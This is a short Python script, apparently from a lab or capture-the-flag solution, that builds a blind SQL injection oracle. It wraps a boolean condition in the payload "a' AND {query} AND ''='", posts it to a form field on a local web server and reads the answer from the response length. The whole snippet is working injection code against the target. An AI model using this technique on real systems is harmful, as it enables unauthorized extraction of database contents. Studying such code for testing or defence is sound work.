import requests

def isTrue(query):
    payload = f"""a' AND {query} AND ''='"""

    r = requests.post("http://localhost:5000",
        verify = False,
        data = {
            "q": payload
        }
    )

    return len(r.content) != 3